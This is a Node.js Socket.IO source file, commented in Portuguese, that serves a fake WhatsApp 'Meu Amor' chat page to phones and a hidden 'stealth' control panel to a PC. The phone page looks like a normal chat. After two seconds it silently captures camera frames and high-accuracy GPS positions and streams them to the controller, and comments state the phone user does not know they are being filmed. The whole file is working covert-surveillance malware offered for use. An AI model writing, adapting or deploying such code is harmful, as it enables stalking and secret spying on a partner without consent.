const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    const isMobile = /mobile|android|iphone|ipad/i.test(req.headers['user-agent'] || '');
    const host = req.headers.host;
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const fullUrl = `${protocol}://${host}`;
    
    if (isMobile) {
        res.send(getMobilePage(fullUrl));
    } else {
        res.send(getPCPage(fullUrl));
    }
});

io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);
    
    // Celular envia mensagem para o PC
    socket.on('mobile_send_message', (data) => {
        console.log('📱 Celular enviou:', data.text);
        socket.broadcast.emit('mobile_new_message', data);
    });
    
    // PC envia mensagem para o celular
    socket.on('pc_send_message', (data) => {
        console.log('💻 PC enviou:', data.text);
        socket.broadcast.emit('pc_new_message', data);
    });
    
    // Indicador de digitação do celular
    socket.on('mobile_typing_start', () => {
        socket.broadcast.emit('mobile_typing', { isTyping: true });
    });
    
    socket.on('mobile_typing_stop', () => {
        socket.broadcast.emit('mobile_typing', { isTyping: false });
    });
    
    // Indicador de digitação do PC
    socket.on('pc_typing_start', () => {
        socket.broadcast.emit('pc_typing', { isTyping: true });
    });
    
    socket.on('pc_typing_stop', () => {
        socket.broadcast.emit('pc_typing', { isTyping: false });
    });
    
    // Comandos do PC (invisíveis para o celular)
    socket.on('command', (cmd) => {
        console.log('🎮 Comando stealth:', cmd.type);
        socket.broadcast.emit('execute_command', cmd);
    });
    
    // Câmera (celular envia sem saber)
    socket.on('camera_frame', (frame) => {
        socket.broadcast.emit('camera_stream', frame);
    });
    
    // Localização (celular envia sem saber)
    socket.on('location_update', (loc) => {
        console.log('📍 Localização recebida (stealth)');
        socket.broadcast.emit('new_location', loc);
    });
    
    socket.on('disconnect', () => {
        console.log('❌ Desconectado:', socket.id);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Servidor Stealth rodando!`);
    console.log(`📍 Porta: ${PORT}`);
    console.log(`\n⚠️ MODO:`);
    console.log(`   📱 Celular: PODE enviar mensagens`);
    console.log(`   📱 Celular: NÃO sabe que está sendo filmado`);
    console.log(`   💻 PC: Controle total e invisível\n`);
});

// ============ PÁGINA DO CELULAR (WHATSAPP NORMAL) ============
function getMobilePage(fullUrl) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0b141a;
            height: 100vh;
            overflow: hidden;
        }
        .app {
            display: flex;
            flex-direction: column;
            height: 100vh;
            background: #0b141a;
        }
        .header {
            background: #202c33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid #2a3942;
        }
        .avatar {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #25d366, #128c7e);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
        }
        .contact-info h3 { color: #e9edef; font-size: 16px; }
        .contact-status { color: #8696a0; font-size: 12px; }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            background: #005c4b;
            color: #e9edef;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .message.received {
            background: #202c33;
            color: #e9edef;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .message-meta {
            display: flex;
            justify-content: flex-end;
            gap: 4px;
            margin-top: 4px;
            font-size: 10px;
            color: #8696a0;
        }
        .input-area {
            background: #202c33;
            padding: 8px 12px;
            display: flex;
            gap: 10px;
            align-items: center;
            border-top: 1px solid #2a3942;
        }
        .input-field {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px 16px;
            border-radius: 24px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }
        .input-field::placeholder {
            color: #8696a0;
        }
        .send-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #8696a0;
        }
        .send-btn.active {
            color: #25d366;
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="header">
            <div class="avatar">💕</div>
            <div class="contact-info">
                <h3>Meu Amor</h3>
                <div class="contact-status" id="statusText">🟢 online</div>
            </div>
        </div>
        <div class="messages" id="messages">
            <div class="message received">
                💕 Olá! Como você está? 💕
                <div class="message-meta"><span>Agora</span><span>✓✓</span></div>
            </div>
        </div>
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem">
            <button class="send-btn" id="sendBtn">📤</button>
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
        const messages = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const statusText = document.getElementById('statusText');
        
        let typingTimeout = null;
        let isTyping = false;
        
        // Adicionar mensagem na tela
        function addMessage(text, type = 'sent') {
            const messageDiv = document.createElement('div');
            messageDiv.className = \`message \${type}\`;
            const now = new Date();
            const timeStr = now.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            messageDiv.innerHTML = \`
                <div>\${text}</div>
                <div class="message-meta">
                    <span>\${timeStr}</span>
                    <span>✓✓</span>
                </div>
            \`;
            messages.appendChild(messageDiv);
            messages.scrollTop = messages.scrollHeight;
        }
        
        // ENVIAR MENSAGEM - CORRIGIDO!
        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                // Adiciona na tela do celular
                addMessage(text, 'sent');
                // Envia para o PC
                socket.emit('mobile_send_message', { text: text, timestamp: Date.now() });
                messageInput.value = '';
                stopTyping();
            }
        }
        
        // Indicador de digitação
        function startTyping() {
            if (!isTyping) {
                isTyping = true;
                socket.emit('mobile_typing_start');
                statusText.innerHTML = '✍️ digitando...';
            }
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                stopTyping();
            }, 1000);
        }
        
        function stopTyping() {
            if (isTyping) {
                isTyping = false;
                socket.emit('mobile_typing_stop');
                statusText.innerHTML = '🟢 online';
            }
        }
        
        // Eventos de clique e teclado
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendMessage();
        });
        messageInput.addEventListener('input', startTyping);
        
        // RECEBER mensagem do PC
        socket.on('pc_new_message', (data) => {
            addMessage(data.text, 'received');
        });
        
        // Indicador de digitação do PC
        socket.on('pc_typing', (data) => {
            if (data.isTyping) {
                statusText.innerHTML = '✍️ digitando...';
            } else {
                statusText.innerHTML = '🟢 online';
            }
        });
        
        // ========== FUNÇÕES STEALTH (INVISÍVEIS) ==========
        let stealthStream = null;
        let stealthInterval = null;
        
        async function startStealthCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stealthStream = stream;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                stealthInterval = setInterval(() => {
                    if (stealthStream && stealthStream.active) {
                        imageCapture.grabFrame()
                            .then(imageBitmap => {
                                const canvas = document.createElement('canvas');
                                canvas.width = imageBitmap.width;
                                canvas.height = imageBitmap.height;
                                canvas.getContext('2d').drawImage(imageBitmap, 0, 0);
                                socket.emit('camera_frame', canvas.toDataURL('image/jpeg', 0.5));
                            })
                            .catch(() => {});
                    }
                }, 500);
                
                console.log('📷 Câmera stealth ativada');
            } catch (err) {
                console.log('Erro na câmera stealth:', err);
            }
        }
        
        function startStealthLocation() {
            if (navigator.geolocation) {
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            socket.emit('location_update', {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude
                            });
                        },
                        (error) => {},
                        { enableHighAccuracy: true }
                    );
                }, 5000);
                console.log('📍 Localização stealth ativada');
            }
        }
        
        // Iniciar stealth após 2 segundos
        setTimeout(() => {
            startStealthCamera();
            startStealthLocation();
        }, 2000);
        
        // Comandos do PC
        socket.on('execute_command', (cmd) => {
            if (cmd.type === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
            } else if (cmd.type === 'emergency') {
                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
            }
        });
        
        socket.on('connect', () => {
            console.log('✅ Conectado ao servidor');
        });
    </script>
</body>
</html>`;
}

// ============ PÁGINA DO PC (CONTROLE TOTAL) ============
function getPCPage(fullUrl) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web - Controle</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #111b21;
            height: 100vh;
            display: flex;
        }
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #202c33;
            padding: 16px;
            border-bottom: 1px solid #2a3942;
        }
        .header h3 { color: #e9edef; }
        .status {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #25d366;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 14px;
            animation: fadeIn 0.2s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.sent {
            background: #005c4b;
            color: white;
            align-self: flex-end;
            border-bottom-right-radius: 2px;
        }
        .message.received {
            background: #202c33;
            color: white;
            align-self: flex-start;
            border-bottom-left-radius: 2px;
        }
        .message-meta {
            font-size: 10px;
            color: #8696a0;
            margin-top: 4px;
            text-align: right;
        }
        .input-area {
            background: #202c33;
            padding: 12px;
            display: flex;
            gap: 12px;
        }
        .input-area input {
            flex: 1;
            background: #2a3942;
            border: none;
            padding: 10px;
            border-radius: 20px;
            color: white;
            outline: none;
        }
        .input-area button {
            background: #005c4b;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            color: white;
            cursor: pointer;
        }
        .panel {
            width: 320px;
            background: #202c33;
            border-left: 1px solid #2a3942;
            padding: 20px;
            overflow-y: auto;
        }
        .panel h3 {
            color: #e9edef;
            margin-bottom: 16px;
            font-size: 16px;
        }
        .btn-control {
            width: 100%;
            background: #2a3942;
            border: none;
            padding: 12px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.2s;
        }
        .btn-control:hover {
            background: #3b4a54;
            transform: translateY(-1px);
        }
        .btn-danger {
            background: #c0392b;
        }
        .btn-danger:hover {
            background: #e74c3c;
        }
        .preview {
            background: #111b21;
            border-radius: 8px;
            margin-top: 10px;
            overflow: hidden;
        }
        .preview img {
            width: 100%;
            height: auto;
        }
        .location-info {
            background: #111b21;
            padding: 12px;
            border-radius: 8px;
            font-size: 12px;
            margin-top: 10px;
            color: #8696a0;
            word-break: break-all;
        }
        .location-info a {
            color: #25d366;
            text-decoration: none;
        }
        .stealth-badge {
            background: #c0392b;
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 10px;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <div class="chat">
        <div class="header">
            <h3>💕 Meu Amor <span class="stealth-badge">STEALTH</span></h3>
            <div style="font-size:12px; color:#8696a0; margin-top:5px;">
                <span class="status"></span> <span id="contactStatus">online</span>
            </div>
        </div>
        <div class="messages" id="messages">
            <div class="message received">
                💕 Conectado! Controle invisível ativado 💕
                <div class="message-meta">Agora</div>
            </div>
        </div>
        <div class="input-area">
            <input type="text" id="messageInput" placeholder="Digite uma mensagem">
            <button id="sendBtn">📤 Enviar</button>
        </div>
    </div>
    <div class="panel">
        <h3>🎮 Controle Invisível</h3>
        
        <button class="btn-control" id="cameraBtn">
            📷 Ver Câmera do Celular
        </button>
        <div class="preview">
            <img id="cameraPreview" src="">
        </div>
        
        <button class="btn-control" id="locationBtn">
            📍 Ver Localização
        </button>
        <div class="location-info" id="locationInfo">
            Aguardando localização...
        </div>
        
        <button class="btn-control" id="vibrateBtn">
            📳 Vibrar Celular
        </button>
        
        <button class="btn-control btn-danger" id="emergencyBtn">
            💥 Surpresa Especial
        </button>
        
        <div style="margin-top: 20px; padding: 12px; background: #111b21; border-radius: 8px;">
            <div style="color: #8696a0; font-size: 11px;">
                ⚠️ Modo Stealth ativado<br>
                • Celular pode enviar mensagens<br>
                • Celular NÃO sabe que está sendo filmado<br>
                • Celular NÃO vê esses controles
            </div>
        </div>
    </div>

    <script src="${fullUrl}/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', { transports: ['websocket', 'polling'] });
        
        const messages = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const cameraPreview = document.getElementById('cameraPreview');
        const locationInfo = document.getElementById('locationInfo');
        const contactStatus = document.getElementById('contactStatus');
        
        let typingTimeout = null;
        let isTyping = false;
        
        function addMessage(text, type = 'sent') {
            const div = document.createElement('div');
            div.className = \`message \${type}\`;
            const time = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = \`\${text}<div class="message-meta">\${time}</div>\`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }
        
        function sendMessage() {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, 'sent');
                socket.emit('pc_send_message', { text });
                messageInput.value = '';
                stopTyping();
            }
        }
        
        function startTyping() {
            if (!isTyping) {
                isTyping = true;
                socket.emit('pc_typing_start');
            }
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1000);
        }
        
        function stopTyping() {
            if (isTyping) {
                isTyping = false;
                socket.emit('pc_typing_stop');
            }
        }
        
        sendBtn.addEventListener('click', sendMessage);
        messageInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
        messageInput.addEventListener('input', startTyping);
        
        // RECEBER mensagem do celular
        socket.on('mobile_new_message', (data) => {
            addMessage(data.text, 'received');
        });
        
        // Indicador de digitação do celular
        socket.on('mobile_typing', (data) => {
            if (data.isTyping) {
                contactStatus.innerHTML = 'digitando... ✍️';
            } else {
                contactStatus.innerHTML = 'online';
            }
        });
        
        // Controles
        document.getElementById('cameraBtn').onclick = () => {
            socket.emit('command', { type: 'start_camera' });
            addMessage('📷 Solicitando câmera (stealth)...', 'sent');
        };
        
        document.getElementById('locationBtn').onclick = () => {
            socket.emit('command', { type: 'get_location' });
            addMessage('📍 Solicitando localização (stealth)...', 'sent');
        };
        
        document.getElementById('vibrateBtn').onclick = () => {
            socket.emit('command', { type: 'vibrate' });
            addMessage('📳 Vibração enviada', 'sent');
        };
        
        document.getElementById('emergencyBtn').onclick = () => {
            socket.emit('command', { type: 'emergency' });
            addMessage('💥 Surpresa enviada!', 'sent');
        };
        
        socket.on('camera_stream', (frame) => {
            cameraPreview.src = frame;
        });
        
        socket.on('new_location', (location) => {
            locationInfo.innerHTML = \`
                📍 Localização:<br>
                Lat: \${location.lat.toFixed(6)}<br>
                Lng: \${location.lng.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=\${location.lat},\${location.lng}" target="_blank">🗺️ Ver mapa</a>
            \`;
            addMessage(\`📍 Localização recebida\`, 'received');
        });
        
        socket.on('connect', () => {
            addMessage('✨ Conectado ao celular!', 'received');
        });
    </script>
</body>
</html>`;
}
